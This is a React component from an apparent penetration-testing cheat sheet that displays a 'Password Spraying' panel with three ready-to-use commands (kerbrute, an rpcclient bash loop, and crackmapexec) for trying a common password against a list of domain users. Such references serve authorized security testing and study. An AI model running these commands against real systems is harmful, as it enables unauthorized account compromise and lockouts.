import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
  Divider,
} from "@mui/material";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const PasswordSpraying = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              Once we obtain a list of valid users, we can password spray with a
              common password to try and login.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Option 1 - Kerbrute</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "kerbrute passwordspray -d {DOMAIN} --dc {IP} {USERNAMES.txt}  Password123"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Option 2 - Bash</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                'for u in $(cat valid_users.txt);do rpcclient -U "$u%Password123" -c "getusername;quit" {IP} | grep Authority; done'
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Option 3 - CrackMapExec</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "sudo crackmapexec smb {IP} -u {USERNAMES.txt} -p Password123 | grep +"
              }
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default PasswordSpraying;
